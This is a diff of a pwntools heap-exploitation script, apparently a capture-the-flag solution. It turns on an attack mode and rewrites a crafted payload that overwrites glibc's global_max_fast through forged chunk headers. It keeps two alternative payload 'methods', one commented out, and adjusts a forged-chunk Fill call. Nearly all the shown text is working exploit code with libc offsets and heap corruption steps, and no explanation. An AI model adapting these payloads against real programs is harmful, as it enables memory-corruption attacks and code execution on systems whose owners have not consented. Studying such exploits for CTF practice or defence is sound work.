@@ -16,7 +16,7 @@ pwn_rop = rop.ROP(pc)
 uselibc = 2 #0 for no,1 for i386,2 for x64
 local = 1
 haslibc = 1
-atta = 0
+atta = 1
 
 if uselibc == 2:
 	context.arch = "amd64"
@@ -154,7 +154,10 @@ def hack():
 
 	global_max_fast = libc.address + 0x39B7D0
 	lg('global_max_fast',global_max_fast)
-	payload = 'a'*0xf0 + p64(0) + p64(0x501) + p64(0) + p64(heap_addr) + p64(0) + p64(global_max_fast-0x20)+'A'*(0x4f0-0x20)+p64(0x21)*8
+	#method 1
+	payload = 'a'*0xf0 + p64(0) + p64(0x501) + p64(0) + p64(global_max_fast-0x10) + p64(0) + p64(heap_addr)+'A'*(0x4f0-0x20)+p64(0x21)*8
+	#method 2
+	#payload = 'a'*0xf0 + p64(0) + p64(0x501) + p64(0) + p64(heap_addr) + p64(0) + p64(global_max_fast-0x20)+'A'*(0x4f0-0x20)+p64(0x21)*8
 	Fill(payload)
 
 	Alloc(0x510)	#4
@@ -163,7 +166,7 @@ def hack():
 
 	Delete(0)
 	Alloc(0x100)
-	Fill(p64(0)+p64(0x101)+p64(heap_addr+8))
+	Fill(p64(0)+p64(0x101))
 	Delete(1)
 	Delete(0)
 	Alloc(0x100)
